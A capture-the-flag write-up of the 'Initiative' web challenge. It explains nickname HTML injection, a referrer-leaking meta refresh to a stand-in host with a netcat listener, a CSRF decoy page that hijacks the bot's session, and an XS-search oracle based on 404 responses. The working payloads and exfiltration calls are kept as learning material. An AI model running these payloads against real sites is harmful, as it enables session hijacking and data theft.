# Initiative

*Initiative* has been the most complex 
web challenge this year. It always starts 
with a login page, and there is no 
difference here. Register a user and log in.
 We get to a page where we can upload 
'blueprints' which have a title and contain 
some arbitrary text.

We can browse our blueprints and look at them
one by one. There is even some 'search' functionality that highlights the matching text.

<img width="727" alt="image" src="https://user-images.githubusercontent.com/6275775/232076164-c1c5c66e-8bfa-4080-b313-9ac4b7fd62ef.png">

There is a somewhat hidden 'report' link in the bottom, that navigates to an other page where we can upload an url:


<img width="717" alt="image" src="https://user-images.githubusercontent.com/6275775/232076495-8d4fada5-cabb-4a2d-90a8-d3b0be2bcfaf.png">

There is a settings page as well where we can set our 'nickname' which will be set as the window title while we are logged in.

## Let's explore the scene some more

We can inject scripts into the blueprint text, but it will not run because the page
has the `content-security-policy: default-src 'self';` header set by the backend, so much
about XSS.

The URL pasted in the report page will be visited by a bot in a few seconds, this must be important....

The 'nickname' is embeded verbatim into the html in the header of the page:

``` html
<title>this is our nickname</title>
```

We can break out from the title tag and insert whatever html we like, but again: javascript will not run this way either.

The search functionality returns 404
 errors when there is no match. It 
still shows the
same page, but the response code 
is 404. This was hard to notice
 at the beginning
but became a key element later.

After login we are redirected 
to the `/blueprints/random` page 
which selects
a blueprint and redirects to 
e.g. `/blueprints/8ae3f361-0e6c-46af-b890-3f64a541c6ad`.

We cannot read other users' 
blueprints even if we know the uuid.

## Identifying blueprints

We can use the `nickname` to inject 
a meta refresh tag into the html,
 this can
redirect the visitor to whatever 
page we like. It would be nice to 
know the origin of
the traffic but unfortunately the 
referrer is not forwarded. At least
that's how I solved the challenge.... But it has turned out later that we can override the referrer policy from a html meta element. Go full throttle and set it to `unsafe-url`.

The combined redirect 'nickname' 
will be something like:

```html
</title>
<meta name="referrer" content="unsafe-url">
<meta http-equiv="refresh" content="0; url='http://example.com:8000'">
<title>
```

and we set up netcat at `example.com`:


```bash
> nc -l 8000
```

We can steal our own referrers 
by going to `https://initiative.secchallenge.crysys.hu/blueprints/random`.

The next step is to hijack the bot 
account somehow. Let's create a 
small html file with some JavaScript in it.
This will send a POST request to 
whoever visits the page and changes 
his own nickname to what we specify.

We are not allowed to run scripts
in the real website but nothing 
prevents us from issuing a POST
from our own context.

There is a little bit of 
hand-waving here, and there can 
be small syntax errors, but 
our `decoy.html` would be something like:

```html
<html>
<body>
    <script>
       
        function setNickname(nickname) {
            return fetch("https://initiative.secchallenge.crysys.hu/settings", {
                "headers": {
                    "content-type": "application/x-www-form-urlencoded",
                },
                "body": `nickname={escape(nickname)}`,
                "method": "POST",
                "mode": "no-cors",
                "credentials": "include"
            })
        }

        async function stealUuid() {
            await setNickname(`
                </title>
                <meta name="referrer" content="unsafe-url">
                <meta http-equiv="refresh" content="0; url='http://example.com:8000'">
                <title>
            `)

            location.href = "https://initiative.secchallenge.crysys.hu/random";
        }

        stealUuid()
</script>
</html>
```

We need to host this file somewhere, say at http://example.com:8000/decoy.html and send the 
URL to the report page. Soon after the bot visits `decoy.html` and starts executing the script. 
It sets its own nickname then navigates to a random blueprint which 
redirects it to http://example.com:8000 where we can capture the referrer and get a valid blueprint 
uuid. 

That's progress! 

### Now go for the flag...

I was a bit surprised but we can load `https://initiative.secchallenge.crysys.hu` into an html `object` element, 
and we can even check if it was loaded successfully.  The following function creates an object element
loads an url and resolves a promise with the outcome of the load.

```javascript
    function loadUrlInObjectElement(url) {
        let s = document.createElement('object');
        document.body.appendChild(s);

        return new Promise((resolve) => {

            // this will be triggered when the page loads successfully
            s.onload = () => {
                resolve(true);
            }

            // this will be triggered in case of 404
            s.onerror = () => {
                resolve(false)
            }

            // just to make it always terminate
            setTimeout(() => {
                resolve(false);
            }, 800);

            // let's start loading the url
            s.data = url;
        }).finally(() => {
            // s.remove();
        }).catch(() => {
            return false;
        });
    }
```

Remember that the search functionality returns 404 when there is no match? This is where it can be used. If a page has the given text this function will return true, and false otherwise.

We also need a small logger to monitor our progress. Remember, the whole html page will run in 
the victim's browser. We can call this function any time we need to send some message for us.

```javascript
 function log(msg) {
    return fetch('http://example.com:8000/log?' + escape(msg));
 }
```

## Putting it together

I let you combine these and write 
the final function that steals 
the flag character by character.

First you need to collect a couple 
of blueprints, and find one that 
contains the word 'cd23'. Once 
you have that you should be able 
to find the rest quite easily.

I didn't realize the trick with 
the referrer override, so my 
brute force for the flag was 
about 80x slower than doing it 
the right way... You should
really start with finding the 
correct blueprint before 
progressing to the last stage.
